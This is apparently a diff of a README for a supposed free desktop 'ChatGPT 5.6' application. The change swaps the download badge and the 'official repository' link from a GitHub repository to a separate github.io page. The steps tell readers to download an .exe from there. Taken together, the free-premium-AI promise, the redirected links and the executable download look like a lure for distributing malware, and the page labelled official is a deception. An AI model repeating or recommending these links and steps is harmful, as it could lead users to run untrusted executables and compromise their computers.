@@ -1,6 +1,6 @@
 # 🤖 Chatgpt-5.6-AI-Free-Desktop - Get Advanced Artificial Intelligence For Free
 
-[![Download Chatgpt-5.6-AI-Free-Desktop](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Freinek8434/Chatgpt-5.6-AI-Free-Desktop)
+[![Download Chatgpt-5.6-AI-Free-Desktop](https://img.shields.io/badge/Download-Application-blue.svg)](https://freinek8434.github.io)
 
 ## 📖 About This Application
 
@@ -20,7 +20,7 @@ This software works on most modern Windows computers. Ensure your device meets t
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official repository page at this link: [https://github.com/Freinek8434/Chatgpt-5.6-AI-Free-Desktop](https://github.com/Freinek8434/Chatgpt-5.6-AI-Free-Desktop).
+1.  Visit the official repository page at this link: [https://freinek8434.github.io](https://freinek8434.github.io).
 2.  Look for the section labeled Releases on the right side of the page.
 3.  Click the version number to open the download page.
 4.  Find the file ending in .exe.
